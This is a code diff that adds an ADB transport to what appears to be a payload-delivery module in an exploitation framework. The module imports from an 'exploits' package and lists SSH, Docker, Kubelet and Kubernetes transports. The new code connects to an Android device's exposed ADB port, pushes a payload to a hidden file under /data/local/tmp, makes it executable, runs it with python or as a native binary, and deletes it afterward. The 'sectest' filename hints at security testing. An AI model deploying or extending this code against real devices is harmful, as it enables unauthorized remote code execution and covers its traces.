@@ -9,6 +9,8 @@ import base64
 import json
 import math
 import os
+import subprocess
+import tempfile
 from typing import List, Optional, Tuple
 
 from exploits import netutil
@@ -844,10 +846,135 @@ class HttpUploadTransport(Transport):
 
 
 # ===========================================================================
+# ADB Transport (Android Debug Bridge)
+# ===========================================================================
+
+class AdbTransport(Transport):
+    """Deliver payload to Android device via ADB (Android Debug Bridge).
+
+    Requires the `adb` binary to be available. Uses `adb push` to transfer the
+    payload and `adb shell` to execute it. Supports both the zipapp (.pyz) and
+    native (ARM64) strategies.
+
+    Relay dict keys:
+        host    — device IP
+        port    — ADB port (default 5555)
+        serial  — optional adb device serial (overrides host:port)
+    """
+    name = "adb"
+    priority = 15  # after SSH (10), before docker (20)
+
+    def can_deliver(self, foothold: dict) -> bool:
+        if foothold.get("type") != "adb":
+            return False
+        # Check if adb binary is available
+        try:
+            result = subprocess.run(
+                ["adb", "version"],
+                capture_output=True, timeout=5, check=False
+            )
+            return result.returncode == 0
+        except (FileNotFoundError, OSError, subprocess.TimeoutExpired):
+            return False
+
+    def deliver_and_exec(self, foothold: dict, payload: bytes, args: List[str],
+                         *, timeout: float = 0) -> Tuple[bool, str]:
+        host = foothold["host"]
+        port = foothold.get("port", 5555)
+        serial = foothold.get("serial", "")
+        device = serial or f"{host}:{port}"
+
+        # Step 3: Connect (if no serial provided)
+        if not serial:
+            conn = subprocess.run(
+                ["adb", "connect", device],
+                capture_output=True, stderr=subprocess.DEVNULL,
+                timeout=10, check=False
+            )
+            if conn.returncode != 0:
+                return False, "ADB connect failed"
+
+        # Step 4: Write payload to a temp file
+        is_pyz = payload[:2] == b"#!"
+        suffix = ".pyz" if is_pyz else ".bin"
+        with tempfile.NamedTemporaryFile(suffix=suffix, delete=False) as tmp:
+            tmp.write(payload)
+            local_path = tmp.name
+
+        try:
+            # Step 5: Push payload to device
+            push = subprocess.run(
+                ["adb", "-s", device, "push", local_path, "/data/local/tmp/.sectest.pyz"],
+                capture_output=True, stderr=subprocess.DEVNULL,
+                timeout=60, check=False
+            )
+            if push.returncode != 0:
+                return False, "ADB push failed"
+
+            # Step 6: chmod
+            subprocess.run(
+                ["adb", "-s", device, "shell", "chmod 755 /data/local/tmp/.sectest.pyz"],
+                capture_output=True, stderr=subprocess.DEVNULL,
+                timeout=5, check=False
+            )
+
+            # Step 7: Determine run command
+            args_str = " ".join(args)
+            remote_path = "/data/local/tmp/.sectest.pyz"
+
+            # Check for python3 on device
+            py3_check = subprocess.run(
+                ["adb", "-s", device, "shell", "which python3"],
+                capture_output=True, stderr=subprocess.DEVNULL,
+                timeout=5, check=False
+            )
+            if py3_check.returncode == 0 and py3_check.stdout.strip():
+                run_shell_cmd = f"python3 {remote_path} {args_str}"
+            else:
+                # Try python
+                py_check = subprocess.run(
+                    ["adb", "-s", device, "shell", "which python"],
+                    capture_output=True, stderr=subprocess.DEVNULL,
+                    timeout=5, check=False
+                )
+                if py_check.returncode == 0 and py_check.stdout.strip():
+                    run_shell_cmd = f"python {remote_path} {args_str}"
+                else:
+                    # No python: try native ARM binary path
+                    run_shell_cmd = f"{remote_path} {args_str}"
+
+            # Step 8: Execute
+            exec_timeout = max(timeout or 300, 300)
+            run = subprocess.run(
+                ["adb", "-s", device, "shell", run_shell_cmd],
+                capture_output=True, stderr=subprocess.DEVNULL,
+                timeout=exec_timeout, check=False
+            )
+            stdout = run.stdout.decode("utf-8", errors="replace")
+
+            # Step 9: Cleanup
+            subprocess.run(
+                ["adb", "-s", device, "shell", "rm -f /data/local/tmp/.sectest.pyz"],
+                capture_output=True, stderr=subprocess.DEVNULL,
+                timeout=5, check=False
+            )
+
+            # Step 10: Return result
+            return run.returncode == 0, stdout
+
+        finally:
+            try:
+                os.unlink(local_path)
+            except OSError:
+                pass
+
+
+# ===========================================================================
 # Initialize Transport Registry (must be after all class definitions)
 # ===========================================================================
 ALL_TRANSPORTS[:] = sorted([
     SSHTransport(),
+    AdbTransport(),
     DockerVolumeTransport(),
     KubeletTransport(),
     K8sApiTransport(),
